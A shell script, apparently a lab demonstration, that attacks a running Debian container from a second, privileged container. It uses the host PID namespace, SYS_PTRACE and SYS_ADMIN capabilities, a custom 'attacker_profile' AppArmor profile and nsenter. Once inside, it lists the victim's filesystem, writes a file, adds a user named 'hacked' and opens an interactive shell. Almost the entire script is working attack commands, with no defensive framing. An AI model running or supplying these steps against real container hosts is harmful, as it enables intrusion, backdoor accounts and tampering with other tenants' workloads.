#!/bin/sh

#List all running containers and keep the one including 'debian'
docker ps | grep debian > dockerps
#Keep the container's id
cut -d' ' -f1 dockerps > containerid
container_id=$(cat containerid)
#Find the pid of the container's process
docker inspect --format {{.State.Pid}} ${container_id} > PID
container_pid=$(cat PID)

#List contents of container's root directory
echo "====== ls / ======"
docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN debian:latest nsenter --target ${container_pid} --mount ls /

#Touch a new file in container's root directory
echo "====== touch HelloFromTheOtherSide ======"
docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN debian:latest nsenter --target ${container_pid} --mount touch HelloFromTheOtherSide

#Add a new user in the container
echo "====== useradd hacked ======"
docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN debian:latest nsenter --target ${container_pid} --mount /usr/sbin/useradd hacked

#Create a shell in the container
echo "====== /bin/bash ======"
docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN debian:latest nsenter --target ${container_pid} --mount /bin/bash

#Clear files
rm PID
rm dockerps
rm containerid
